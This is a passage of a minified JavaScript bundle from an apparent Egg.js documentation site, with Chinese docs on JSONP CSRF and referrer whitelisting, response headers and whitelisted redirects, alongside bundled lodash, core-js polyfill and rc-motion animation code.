\u6821\u9a8c\u65f6\uff0c\u5ba2\u6237\u7aef\u5728\u53d1\u8d77 JSONP \u8bf7\u6c42\u65f6\uff0c\u4e5f\u8981\u5e26\u4e0a CSRF token\uff0c\u5982\u679c\u53d1\u8d77 JSONP \u7684\u8bf7\u6c42\u65b9\u6240\u5728\u7684\u9875\u9762\u548c\u6211\u4eec\u7684\u670d\u52a1\u5728\u540c\u4e00\u4e2a\u4e3b\u57df\u540d\u4e4b\u4e0b\u7684\u8bdd\uff0c\u53ef\u4ee5\u8bfb\u53d6\u5230 Cookie \u4e2d\u7684 CSRF token\uff08\u5728 CSRF token \u7f3a\u5931\u65f6\u4e5f\u53ef\u4ee5\u81ea\u884c\u8bbe\u7f6e CSRF token \u5230 Cookie \u4e2d\uff09\uff0c\u5e76\u5728\u8bf7\u6c42\u65f6\u5e26\u4e0a\u8be5 token\u3002"),r.a.createElement("h5",{id:"referrer-\u6821\u9a8c"},r.a.createElement(l["AnchorLink"],{to:"#referrer-\u6821\u9a8c","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"referrer \u6821\u9a8c"),r.a.createElement("p",null,"\u5982\u679c\u5728\u540c\u4e00\u4e2a\u4e3b\u57df\u4e4b\u4e0b\uff0c\u53ef\u4ee5\u901a\u8fc7\u5f00\u542f CSRF \u7684\u65b9\u5f0f\u6765\u6821\u9a8c JSONP \u8bf7\u6c42\u7684\u6765\u6e90\uff0c\u800c\u5982\u679c\u60f3\u5bf9\u5176\u4ed6\u57df\u540d\u7684\u7f51\u9875\u63d0\u4f9b JSONP \u670d\u52a1\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e referrer \u767d\u540d\u5355\u7684\u65b9\u5f0f\u6765\u9650\u5236 JSONP \u7684\u8bf7\u6c42\u65b9\u5728\u53ef\u63a7\u8303\u56f4\u4e4b\u5185\u3002"),r.a.createElement(o["a"],{code:"//config/config.default.js\nexports.jsonp = {\n  whiteList: /^https?:\\/\\/test.com\\//,\n  // whiteList: '.test.com',\n  // whiteList: 'sub.test.com',\n  // whiteList: [ 'sub.test.com', 'sub2.test.com' ],\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("code",null,"whiteList")," \u53ef\u4ee5\u914d\u7f6e\u4e3a\u6b63\u5219\u8868\u8fbe\u5f0f\u3001\u5b57\u7b26\u4e32\u6216\u8005\u6570\u7ec4\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u6b63\u5219\u8868\u8fbe\u5f0f\uff1a\u6b64\u65f6\u53ea\u6709\u8bf7\u6c42\u7684 Referrer \u5339\u914d\u8be5\u6b63\u5219\u65f6\u624d\u5141\u8bb8\u8bbf\u95ee JSONP \u63a5\u53e3\u3002\u5728\u8bbe\u7f6e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u65f6\u5019\uff0c\u6ce8\u610f\u5f00\u5934\u7684 ",r.a.createElement("code",null,"^")," \u4ee5\u53ca\u7ed3\u5c3e\u7684 ",r.a.createElement("code",null,"\\/"),"\uff0c\u4fdd\u8bc1\u5339\u914d\u5230\u5b8c\u6574\u7684\u57df\u540d\u3002")),r.a.createElement(o["a"],{code:"exports.jsonp = {\n  whiteList: /^https?:\\/\\/test.com\\//,\n};\n// matches referrer:\n// https://test.com/hello\n// http://test.com/",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5b57\u7b26\u4e32\uff1a\u8bbe\u7f6e\u5b57\u7b26\u4e32\u5f62\u5f0f\u7684\u767d\u540d\u5355\u65f6\u5206\u4e3a\u4e24\u79cd\uff0c\u5f53\u5b57\u7b26\u4e32\u4ee5 ",r.a.createElement("code",null,".")," \u5f00\u5934\uff0c\u4f8b\u5982 ",r.a.createElement("code",null,".test.com")," \u65f6\uff0c\u4ee3\u8868 referrer \u767d\u540d\u5355\u4e3a ",r.a.createElement("code",null,"test.com")," \u7684\u6240\u6709\u5b50\u57df\u540d\uff0c\u5305\u62ec ",r.a.createElement("code",null,"test.com")," \u81ea\u8eab\u3002\u5f53\u5b57\u7b26\u4e32\u4e0d\u4ee5 ",r.a.createElement("code",null,".")," \u5f00\u5934\uff0c\u4f8b\u5982 ",r.a.createElement("code",null,"sub.test.com"),"\uff0c\u4ee3\u8868 referrer \u767d\u540d\u5355\u4e3a ",r.a.createElement("code",null,"sub.test.com")," \u8fd9\u4e00\u4e2a\u57df\u540d\u3002\uff08\u540c\u65f6\u652f\u6301 HTTP \u548c HTTPS\uff09\u3002")),r.a.createElement(o["a"],{code:"exports.jsonp = {\n  whiteList: '.test.com',\n};\n// matches domain test.com:\n// https://test.com/hello\n// http://test.com/\n\n// matches subdomain\n// https://sub.test.com/hello\n// http://sub.sub.test.com/\n\nexports.jsonp = {\n  whiteList: 'sub.test.com',\n};\n// only matches domain sub.test.com:\n// https://sub.test.com/hello\n// http://sub.test.com/",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u6570\u7ec4\uff1a\u5f53\u8bbe\u7f6e\u7684\u767d\u540d\u5355\u4e3a\u6570\u7ec4\u65f6\uff0c\u4ee3\u8868\u53ea\u8981\u6ee1\u8db3\u6570\u7ec4\u4e2d\u4efb\u610f\u4e00\u4e2a\u5143\u7d20\u7684\u6761\u4ef6\u5373\u53ef\u901a\u8fc7 referrer \u6821\u9a8c\u3002")),r.a.createElement(o["a"],{code:"exports.jsonp = {\n  whiteList: ['sub.test.com', 'sub2.test.com'],\n};\n// matches domain sub.test.com and sub2.test.com:\n// https://sub.test.com/hello\n// http://sub2.test.com/",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u5f53 CSRF \u548c referrer \u6821\u9a8c\u540c\u65f6\u5f00\u542f\u65f6\uff0c\u8bf7\u6c42\u53d1\u8d77\u65b9\u53ea\u9700\u8981\u6ee1\u8db3\u4efb\u610f\u4e00\u4e2a\u6761\u4ef6\u5373\u53ef\u901a\u8fc7 JSONP \u7684\u5b89\u5168\u6821\u9a8c\u3002")),r.a.createElement("h3",{id:"\u8bbe\u7f6e-header"},r.a.createElement(l["AnchorLink"],{to:"#\u8bbe\u7f6e-header","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8bbe\u7f6e Header"),r.a.createElement("p",null,"\u6211\u4eec\u901a\u8fc7\u72b6\u6001\u7801\u6807\u8bc6\u8bf7\u6c42\u6210\u529f\u4e0e\u5426\u3001\u72b6\u6001\u5982\u4f55\uff0c\u5728 body \u4e2d\u8bbe\u7f6e\u54cd\u5e94\u7684\u5185\u5bb9\u3002\u800c\u901a\u8fc7\u54cd\u5e94\u7684 Header\uff0c\u8fd8\u53ef\u4ee5\u8bbe\u7f6e\u4e00\u4e9b\u6269\u5c55\u4fe1\u606f\u3002"),r.a.createElement("p",null,"\u901a\u8fc7 ",r.a.createElement("code",null,"ctx.set(key, value)")," \u65b9\u6cd5\u53ef\u4ee5\u8bbe\u7f6e\u4e00\u4e2a\u54cd\u5e94\u5934\uff0c",r.a.createElement("code",null,"ctx.set(headers)")," \u8bbe\u7f6e\u591a\u4e2a Header\u3002"),r.a.createElement(o["a"],{code:"// app/controller/api.js\nclass ProxyController extends Controller {\n  async show() {\n    const ctx = this.ctx;\n    const start = Date.now();\n    ctx.body = await ctx.service.post.get();\n    const used = Date.now() - start;\n    // \u8bbe\u7f6e\u4e00\u4e2a\u54cd\u5e94\u5934\n    ctx.set('show-response-time', used.toString());\n  }\n}",lang:"js"}),r.a.createElement("h3",{id:"\u91cd\u5b9a\u5411"},r.a.createElement(l["AnchorLink"],{to:"#\u91cd\u5b9a\u5411","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u91cd\u5b9a\u5411"),r.a.createElement("p",null,"\u6846\u67b6\u901a\u8fc7 security \u63d2\u4ef6\u8986\u76d6\u4e86 koa \u539f\u751f\u7684 ",r.a.createElement("code",null,"ctx.redirect")," \u5b9e\u73b0\uff0c\u4ee5\u63d0\u4f9b\u66f4\u52a0\u5b89\u5168\u7684\u91cd\u5b9a\u5411\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"ctx.redirect(url)")," \u5982\u679c\u4e0d\u5728\u914d\u7f6e\u7684\u767d\u540d\u5355\u57df\u540d\u5185\uff0c\u5219\u7981\u6b62\u8df3\u8f6c\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"ctx.unsafeRedirect(url)")," \u4e0d\u5224\u65ad\u57df\u540d\uff0c\u76f4\u63a5\u8df3\u8f6c\uff0c\u4e00\u822c\u4e0d\u5efa\u8bae\u4f7f\u7528\uff0c\u660e\u786e\u4e86\u89e3\u53ef\u80fd\u5e26\u6765\u7684\u98ce\u9669\u540e\u4f7f\u7528\u3002")),r.a.createElement("p",null,"\u7528\u6237\u5982\u679c\u4f7f\u7528",r.a.createElement("code",null,"ctx.redirect"),"\u65b9\u6cd5\uff0c\u9700\u8981\u5728\u5e94\u7528\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u505a\u5982\u4e0b\u914d\u7f6e\uff1a"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.security = {\n  domainWhiteList: ['.domain.com'], // \u5b89\u5168\u767d\u540d\u5355\uff0c\u4ee5 . \u5f00\u5934\n};",lang:"js"}),r.a.createElement("p",null,"\u82e5\u7528\u6237\u6ca1\u6709\u914d\u7f6e ",r.a.createElement("code",null,"domainWhiteList")," \u6216\u8005 ",r.a.createElement("code",null,"domainWhiteList"),"\u6570\u7ec4\u5185\u4e3a\u7a7a\uff0c\u5219\u9ed8\u8ba4\u4f1a\u5bf9\u6240\u6709\u8df3\u8f6c\u8bf7\u6c42\u653e\u884c\uff0c\u5373\u7b49\u540c\u4e8e",r.a.createElement("code",null,"ctx.unsafeRedirect(url)"))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},"5svC":function(e,t,n){"use strict";n.d(t,"a",(function(){return r}));var a=n("3Qq0");function r(e,t){var n=Object(a["a"])({},e);return Array.isArray(t)&&t.forEach((function(e){delete n[e]})),n}},"5xdi":function(e,t,n){(function(t){var n="Expected a function",a=NaN,r="[object Symbol]",l=/^\s+|\s+$/g,o=/^[-+]0x[0-9a-f]+$/i,i=/^0b[01]+$/i,c=/^0o[0-7]+$/i,s=parseInt,u="object"==typeof t&&t&&t.Object===Object&&t,d="object"==typeof self&&self&&self.Object===Object&&self,m=u||d||Function("return this")(),p=Object.prototype,h=p.toString,g=Math.max,f=Math.min,E=function(){return m.Date.now()};function b(e,t,a){var r,l,o,i,c,s,u=0,d=!1,m=!1,p=!0;if("function"!=typeof e)throw new TypeError(n);function h(t){var n=r,a=l;return r=l=void 0,u=t,i=e.apply(a,n),i}function b(e){return u=e,c=setTimeout(w,t),d?h(e):i}function v(e){var n=e-s,a=e-u,r=t-n;return m?f(r,o-a):r}function k(e){var n=e-s,a=e-u;return void 0===s||n>=t||n<0||m&&a>=o}function w(){var e=E();if(k(e))return j(e);c=setTimeout(w,v(e))}function j(e){return c=void 0,p&&r?h(e):(r=l=void 0,i)}function S(){void 0!==c&&clearTimeout(c),u=0,r=s=l=c=void 0}function C(){return void 0===c?i:j(E())}function A(){var e=E(),n=k(e);if(r=arguments,l=this,s=e,n){if(void 0===c)return b(s);if(m)return c=setTimeout(w,t),h(s)}return void 0===c&&(c=setTimeout(w,t)),i}return t=x(t)||0,y(a)&&(d=!!a.leading,m="maxWait"in a,o=m?g(x(a.maxWait)||0,t):o,p="trailing"in a?!!a.trailing:p),A.cancel=S,A.flush=C,A}function v(e,t,a){var r=!0,l=!0;if("function"!=typeof e)throw new TypeError(n);return y(a)&&(r="leading"in a?!!a.leading:r,l="trailing"in a?!!a.trailing:l),b(e,t,{leading:r,maxWait:t,trailing:l})}function y(e){var t=typeof e;return!!e&&("object"==t||"function"==t)}function k(e){return!!e&&"object"==typeof e}function w(e){return"symbol"==typeof e||k(e)&&h.call(e)==r}function x(e){if("number"==typeof e)return e;if(w(e))return a;if(y(e)){var t="function"==typeof e.valueOf?e.valueOf():e;e=y(t)?t+"":t}if("string"!=typeof e)return 0===e?e:+e;e=e.replace(l,"");var n=i.test(e);return n||c.test(e)?s(e.slice(2),n?2:8):o.test(e)?a:+e}e.exports=v}).call(this,n("CwJZ"))},"60aI":function(e,t,n){"use strict";var a=n("0mt+"),r=n("Xdqv"),l=n("YtQ9"),o=n("a7jj"),i=n("m/os"),c=n("N0Us"),s=n("ESQ9"),u=n("HmG0"),d=n("mIyh"),m=n("q7Pv"),p=n("/bXB"),h=m("isConcatSpreadable"),g=9007199254740991,f="Maximum allowed index exceeded",E=p>=51||!r((function(){var e=[];return e[h]=!1,e.concat()[0]!==e})),b=d("concat"),v=function(e){if(!o(e))return!1;var t=e[h];return void 0!==t?!!t:l(e)},y=!E||!b;a({target:"Array",proto:!0,forced:y},{concat:function(e){var t,n,a,r,l,o=i(this),d=u(o,0),m=0;for(t=-1,a=arguments.length;t<a;t++)if(l=-1===t?o:arguments[t],v(l)){if(r=c(l.length),m+r>g)throw TypeError(f);for(n=0;n<r;n++,m++)n in l&&s(d,m,l[n])}else{if(m>=g)throw TypeError(f);s(d,m++,l)}return d.length=m,d}})},"63+Q":function(e,t,n){var a=n("31yA"),r=n("AcHn"),l=n("WQtb").indexOf,o=n("pX0n");e.exports=function(e,t){var n,i=r(e),c=0,s=[];for(n in i)!a(o,n)&&a(i,n)&&s.push(n);while(t.length>c)a(i,n=t[c++])&&(~l(s,n)||s.push(n));return s}},"64/3":function(e,t,n){"use strict";n.d(t,"a",(function(){return be}));var a=n("qPib"),r=n("3Qq0"),l=n("0YMn"),o=n("nzxN"),i=n("VGn1"),c=n.n(i),s=n("PE0O"),u=n("abDE"),d=n("FU0I"),m=n("EJBU"),p=d["createContext"]({});var h=n("E3E7"),g=n("+g4N"),f=n("zraO"),E=n("+ujd"),b=function(e){Object(f["a"])(n,e);var t=Object(E["a"])(n);function n(){return Object(h["a"])(this,n),t.apply(this,arguments)}return Object(g["a"])(n,[{key:"render",value:function(){return this.props.children}}]),n}(d["Component"]),v=b,y=n("wx68"),k="none",w="appear",x="enter",j="leave",S="none",C="prepare",A="start",L="active",T="end",N="prepared",O=n("d9lq");function I(e,t){var n={};return n[e.toLowerCase()]=t.toLowerCase(),n["Webkit".concat(e)]="webkit".concat(t),n["Moz".concat(e)]="moz".concat(t),n["ms".concat(e)]="MS".concat(t),n["O".concat(e)]="o".concat(t.toLowerCase()),n}function P(e,t){var n={animationend:I("Animation","AnimationEnd"),transitionend:I("Transition","TransitionEnd")};return e&&("AnimationEvent"in t||delete n.animationend.animation,"TransitionEvent"in t||delete n.transitionend.transition),n}var R=P(Object(O["a"])(),"undefined"!==typeof window?window:{}),_={};if(Object(O["a"])()){var q=document.createElement("div");_=q.style}var M={};function F(e){if(M[e])return M[e];var t=R[e];if(t)for(var n=Object.keys(t),a=n.length,r=0;r<a;r+=1){var l=n[r];if(Object.prototype.hasOwnProperty.call(t,l)&&l in _)return M[e]=t[l],M[e]}return""}var D=F("animationend"),U=F("transitionend"),z=!(!D||!U),H=D||"animationend",B=U||"transitionend";function W(e,t){if(!e)return null;if("object"===Object(o["a"])(e)){var n=t.replace(/-\w/g,(function(e){return e[1].toUpperCase()}));return e[n]}return"".concat(e,"-").concat(t)}var V=function(e){var t=Object(d["useRef"])(),n=Object(d["useRef"])(e);n.current=e;var a=d["useCallback"]((function(e){n.current(e)}),[]);function r(e){e&&(e.removeEventListener(B,a),e.removeEventListener(H,a))}function l(e){t.current&&t.current!==e&&r(t.current),e&&e!==t.current&&(e.addEventListener(B,a),e.addEventListener(H,a),t.current=e)}return d["useEffect"]((function(){return function(){r(t.current)}}),[]),[l,r]},$=Object(O["a"])()?d["useLayoutEffect"]:d["useEffect"],G=$,X=n("WeeI"),Q=function(){var e=d["useRef"](null);function t(){X["a"].cancel(e.current)}function n(a){var r=arguments.length>1&&void 0!==arguments[1]?arguments[1]:2;t();var l=Object(X["a"])((function(){r<=1?a({isCanceled:function(){return l!==e.current}}):n(a,r-1)}));e.current=l}return d["useEffect"]((function(){return function(){t()}}),[]),[n,t]},K=[C,A,L,T],J=[C,N],Y=!1,Z=!0;function ee(e){return e===L||e===T}var te=function(e,t,n){var a=Object(y["a"])(S),r=Object(l["a"])(a,2),o=r[0],i=r[1],c=Q(),s=Object(l["a"])(c,2),u=s[0],m=s[1];function p(){i(C,!0)}var h=t?J:K;return G((function(){if(o!==S&&o!==T){var e=h.indexOf(o),t=h[e+1],a=n(o);a===Y?i(t,!0):t&&u((function(e){function n(){e.isCanceled()||i(t,!0)}!0===a?n():Promise.resolve(a).then(n)}))}}),[e,o]),d["useEffect"]((function(){return function(){m()}}),[]),[p,o]};function ne(e,t,n,o){var i=o.motionEnter,c=void 0===i||i,s=o.motionAppear,u=void 0===s||s,m=o.motionLeave,p=void 0===m||m,h=o.motionDeadline,g=o.motionLeaveImmediately,f=o.onAppearPrepare,E=o.onEnterPrepare,b=o.onLeavePrepare,v=o.onAppearStart,S=o.onEnterStart,T=o.onLeaveStart,O=o.onAppearActive,I=o.onEnterActive,P=o.onLeaveActive,R=o.onAppearEnd,_=o.onEnterEnd,q=o.onLeaveEnd,M=o.onVisibleChanged,F=Object(y["a"])(),D=Object(l["a"])(F,2),U=D[0],z=D[1],H=Object(y["a"])(k),B=Object(l["a"])(H,2),W=B[0],$=B[1],X=Object(y["a"])(null),Q=Object(l["a"])(X,2),K=Q[0],J=Q[1],ne=Object(d["useRef"])(!1),ae=Object(d["useRef"])(null);function re(){return n()}var le=Object(d["useRef"])(!1);function oe(){$(k,!0),J(null,!0)}function ie(e){var t=re();if(!e||e.deadline||e.target===t){var n,a=le.current;W===w&&a?n=null===R||void 0===R?void 0:R(t,e):W===x&&a?n=null===_||void 0===_?void 0:_(t,e):W===j&&a&&(n=null===q||void 0===q?void 0:q(t,e)),W!==k&&a&&!1!==n&&oe()}}var ce=V(ie),se=Object(l["a"])(ce,1),ue=se[0],de=function(e){var t,n,r;switch(e){case w:return t={},Object(a["a"])(t,C,f),Object(a["a"])(t,A,v),Object(a["a"])(t,L,O),t;case x:return n={},Object(a["a"])(n,C,E),Object(a["a"])(n,A,S),Object(a["a"])(n,L,I),n;case j:return r={},Object(a["a"])(r,C,b),Object(a["a"])(r,A,T),Object(a["a"])(r,L,P),r;default:return{}}},me=d["useMemo"]((function(){return de(W)}),[W]),pe=te(W,!e,(function(e){if(e===C){var t=me[C];return t?t(re()):Y}var n;fe in me&&J((null===(n=me[fe])||void 0===n?void 0:n.call(me,re(),null))||null);return fe===L&&(ue(re()),h>0&&(clearTimeout(ae.current),ae.current=setTimeout((function(){ie({deadline:!0})}),h))),fe===N&&oe(),Z})),he=Object(l["a"])(pe,2),ge=he[0],fe=he[1],Ee=ee(fe);le.current=Ee,G((function(){z(t);var n,a=ne.current;ne.current=!0,!a&&t&&u&&(n=w),a&&t&&c&&(n=x),(a&&!t&&p||!a&&g&&!t&&p)&&(n=j);var r=de(n);n&&(e||r[C])?($(n),ge()):$(k)}),[t]),Object(d["useEffect"])((function(){(W===w&&!u||W===x&&!c||W===j&&!p)&&$(k)}),[u,c,p]),Object(d["useEffect"])((function(){return function(){ne.current=!1,clearTimeout(ae.current)}}),[]);var be=d["useRef"](!1);Object(d["useEffect"])((function(){U&&(be.current=!0),void 0!==U&&W===k&&((be.current||U)&&(null===M||void 0===M||M(U)),be.current=!0)}),[U,W]);var ve=K;return me[C]&&fe===A&&(ve=Object(r["a"])({transition:"none"},ve)),[W,fe,ve,null!==U&&void 0!==U?U:t]}function ae(e){var t=e;function n(e,n){return!(!e.motionName||!t||!1===n)}"object"===Object(o["a"])(e)&&(t=e.transitionSupport);var i=d["forwardRef"]((function(e,t){var o=e.visible,i=void 0===o||o,m=e.removeOnLeave,h=void 0===m||m,g=e.forceRender,f=e.children,E=e.motionName,b=e.leavedClassName,y=e.eventProps,w=d["useContext"](p),x=w.motion,j=n(e,x),S=Object(d["useRef"])(),L=Object(d["useRef"])();function T(){try{return S.current instanceof HTMLElement?S.current:Object(s["a"])(L.current)}catch(e){return null}}var N=ne(j,i,T,e),O=Object(l["a"])(N,4),I=O[0],P=O[1],R=O[2],_=O[3],q=d["useRef"](_);_&&(q.current=!0);var M,F=d["useCallback"]((function(e){S.current=e,Object(u["b"])(t,e)}),[t]),D=Object(r["a"])(Object(r["a"])({},y),{},{visible:i});if(f)if(I===k)M=_?f(Object(r["a"])({},D),F):!h&&q.current&&b?f(Object(r["a"])(Object(r["a"])({},D),{},{className:b}),F):g||!h&&!b?f(Object(r["a"])(Object(r["a"])({},D),{},{style:{display:"none"}}),F):null;else{var U,z;P===C?z="prepare":ee(P)?z="active":P===A&&(z="start");var H=W(E,"".concat(I,"-").concat(z));M=f(Object(r["a"])(Object(r["a"])({},D),{},{className:c()(W(E,I),(U={},Object(a["a"])(U,H,H&&z),Object(a["a"])(U,E,"string"===typeof E),U)),style:R}),F)}else M=null;if(d["isValidElement"](M)&&Object(u["c"])(M)){var B=M,V=B.ref;V||(M=d["cloneElement"](M,{ref:F}))}return d["createElement"](v,{ref:L},M)}));return i.displayName="CSSMotion",i}var re=ae(z),le=n("2EJr"),oe=n("ohqK"),ie="add",ce="keep",se="remove",ue="removed";function de(e){var t;return t=e&&"object"===Object(o["a"])(e)&&"key"in e?e:{key:e},Object(r["a"])(Object(r["a"])({},t),{},{key:String(t.key)})}function me(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:[];return e.map(de)}function pe(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:[],t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:[],n=[],a=0,l=t.length,o=me(e),i=me(t);o.forEach((function(e){for(var t=!1,o=a;o<l;o+=1){var c=i[o];if(c.key===e.key){a<o&&(n=n.concat(i.slice(a,o).map((function(e){return Object(r["a"])(Object(r["a"])({},e),{},{status:ie})}))),a=o),n.push(Object(r["a"])(Object(r["a"])({},c),{},{status:ce})),a+=1,t=!0;break}}t||n.push(Object(r["a"])(Object(r["a"])({},e),{},{status:se}))})),a<l&&(n=n.concat(i.slice(a).map((function(e){return Object(r["a"])(Object(r["a"])({},e),{},{status:ie})}))));var c={};n.forEach((function(e){var t=e.key;c[t]=(c[t]||0)+1}));var s=Object.keys(c).filter((function(e){return c[e]>1}));return s.forEach((function(e){n=n.filter((function(t){var n=t.key,a=t.status;return n!==e||a!==se})),n.forEach((function(t){t.key===e&&(t.status=ce)}))})),n}var he=["component","children","onVisibleChanged","onAllRemoved"],ge=["status"],fe=["eventProps","visible","children","motionName","motionAppear","motionEnter","motionLeave","motionLeaveImmediately","motionDeadline","removeOnLeave","leavedClassName","onAppearStart","onAppearActive","onAppearEnd","onEnterStart","onEnterActive","onEnterEnd","onLeaveStart","onLeaveActive","onLeaveEnd"];function Ee(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:re,n=function(e){Object(f["a"])(l,e);var n=Object(E["a"])(l);function l(){var e;Object(h["a"])(this,l);for(var t=arguments.length,o=new Array(t),i=0;i<t;i++)o[i]=arguments[i];return e=n.call.apply(n,[this].concat(o)),Object(a["a"])(Object(oe["a"])(e),"state",{keyEntities:[]}),Object(a["a"])(Object(oe["a"])(e),"removeKey",(function(t){var n=e.state.keyEntities,a=n.map((function(e){return e.key!==t?e:Object(r["a"])(Object(r["a"])({},e),{},{status:ue})}));return e.setState({keyEntities:a}),a.filter((function(e){var t=e.status;return t!==ue})).length})),e}return Object(g["a"])(l,[{key:"render",value:function(){var e=this,n=this.state.keyEntities,a=this.props,r=a.component,l=a.children,o=a.onVisibleChanged,i=a.onAllRemoved,c=Object(m["a"])(a,he),s=r||d["Fragment"],u={};return fe.forEach((function(e){u[e]=c[e],delete c[e]})),delete c.keys,d["createElement"](s,c,n.map((function(n){var a=n.status,r=Object(m["a"])(n,ge),c=a===ie||a===ce;return d["createElement"](t,Object(le["a"])({},u,{key:r.key,visible:c,eventProps:r,onVisibleChanged:function(t){if(null===o||void 0===o||o(t,{key:r.key}),!t){var n=e.removeKey(r.key);0===n&&i&&i()}}}),l)})))}}],[{key:"getDerivedStateFromProps",value:function(e,t){var n=e.keys,a=t.keyEntities,r=me(n),l=pe(a,r);return{keyEntities:l.filter((function(e){var t=a.find((function(t){var n=t.key;return e.key===n}));return!t||t.status!==ue||e.status!==se}))}}}]),l}(d["Component"]);return Object(a["a"])(n,"defaultProps",{component:"div"}),n}var be=Ee(z);t["b"]=re},"65ru":function(e,t,n){var a=n("RNGE"),r=/^\s+/;function l(e){return e?e.slice(0,a(e)+1).replace(r,""):e}e.exports=l},"67jT":function(e,t,n){"use strict";var a=n("0mt+"),r=n("SCbZ"),l=n("y8bx"),o=n("qEhY"),i=n("Xdqv"),c=1..toFixed,s=Math.floor,u=function(e,t,n){return 0===t?n:t%2===1?u(e,t-1,n*e):u(e*e,t/2,n)},d=function(e){var t=0,n=e;while(n>=4096)t+=12,n/=4096;while(n>=2)t+=1,n/=2;return t},m=c&&("0.000"!==8e-5.toFixed(3)||"1"!==.9.toFixed(0)||"1.25"!==1.255.toFixed(2)||"1000000000000000128"!==(0xde0b6b3a7640080).toFixed(0))||!i((function(){c.call({})}));a({target:"Number",proto:!0,forced:m},{toFixed:function(e){var t,n,a,i,c=l(this),m=r(e),p=[0,0,0,0,0,0],h="",g="0",f=function(e,t){var n=-1,a=t;while(++n<6)a+=e*p[n],p[n]=a%1e7,a=s(a/1e7)},E=function(e){var t=6,n=0;while(--t>=0)n+=p[t],p[t]=s(n/e),n=n%e*1e7},b=function(){var e=6,t="";while(--e>=0)if(""!==t||0===e||0!==p[e]){var n=String(p[e]);t=""===t?n:t+o.call("0",7-n.length)+n}return t};if(m<0||m>20)throw RangeError("Incorrect fraction digits");if(c!=c)return"NaN";if(c<=-1e21||c>=1e21)return String(c);if(c<0&&(h="-",c=-c),c>1e-21)if(t=d(c*u(2,69,1))-69,n=t<0?c*u(2,-t,1):c/u(2,t,1),n*=4503599627370496,t=52-t,t>0){f(0,n),a=m;while(a>=7)f(1e7,0),a-=7;f(u(10,a,1),0),a=t-1;while(a>=23)E(1<<23),a-=23;E(1<<a),f(1,1),E(2),g=b()}else f(0,n),f(1<<-t,0),g=b()+o.call("0",m);return m>0?(i=g.length,g=h+(i<=m?"0."+o.call("0",m-i)+g:g.slice(0,i-m)+"."+g.slice(i-m))):g=h+g,g}})},"68x4":function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("V3tB"),o=n("oyD1"),i=n("XaNN"),c=n("G9w8"),s=n("j9ts"),u=n("AOzO"),d=n("NBU9");a({target:"Map",proto:!0,real:!0,forced:r},{mapKeys:function(e){var t=o(this),n=u(t),a=c(e,arguments.length>1?arguments[1]:void 0,3),r=new(s(t,l("Map"))),m=i(r.set);return d(n,(function(e,n){m.call(r,a(n,e,t),n)}),void 0,!0,!0),r}})},"69j1":function(e,t,n){"use strict";var a=n("AcHn"),r=n("QiLd"),l=n("GIAz"),o=n("lz/I"),i=n("RGX9"),c="Array Iterator",s=o.set,u=o.getterFor(c);e.exports=i(Array,"Array",(function(e,t){s(this,{type:c,target:a(e),index:0,kind:t})}),(function(){var e=u(this),t=e.target,n=e.kind,a=e.index++;return!t||a>=t.length?(e.target=void 0,{value:void 0,done:!0}):"keys"==n?{value:a,done:!1}:"values"==n?{value:t[a],done:!1}:{value:[a,t[a]],done:!1}}),"values"),l.Arguments=l.Array,r("keys"),r("values"),r("entries")},"6CDp":function(e,t,n){var a=n("WM7W");a("replace")},"6TCi":function(e,t,n){var a=n("WM7W");a("hasInstance")},"6xEZ":function(e,t){function n(e,t){var n=null==e?null:"undefined"!==typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var a,r,l=[],o=!0,i=!1;try{for(n=n.call(e);!(o=(a=n.next()).done);o=!0)if(l.push(a.value),t&&l.length===t)break}catch(c){i=!0,r=c}finally{try{o||null==n["return"]||n["return"]()}finally{if(i)throw r}}return l}}e.exports=n,e.exports.__esModule=!0,e.exports["default"]=e.exports},"7Rj7":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u5728\u672c\u7ae0\uff0c\u6211\u4eec\u4f1a\u521d\u6b65\u4ecb\u7ecd\u4e00\u4e0b\u6846\u67b6\u4e2d\u5185\u7f6e\u7684\u4e00\u4e9b\u57fa\u7840\u5bf9\u8c61\uff0c\u5305\u62ec\u4ece ",r.a.createElement(l["Link"],{to:"http://koajs.com/"},"Koa")," \u7ee7\u627f\u800c\u6765\u7684 4 \u4e2a\u5bf9\u8c61\uff08Application, Context, Request, Response) \u4ee5\u53ca\u6846\u67b6\u6269\u5c55\u7684\u4e00\u4e9b\u5bf9\u8c61\uff08Controller, Service, Helper, Config, Logger\uff09\uff0c\u5728\u540e\u7eed\u7684\u6587\u6863\u9605\u8bfb\u4e2d\u6211\u4eec\u4f1a\u7ecf\u5e38\u9047\u5230\u5b83\u4eec\u3002"),r.a.createElement("h2",{id:"application"},r.a.createElement(l["AnchorLink"],{to:"#application","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Application"),r.a.createElement("p",null,"Application 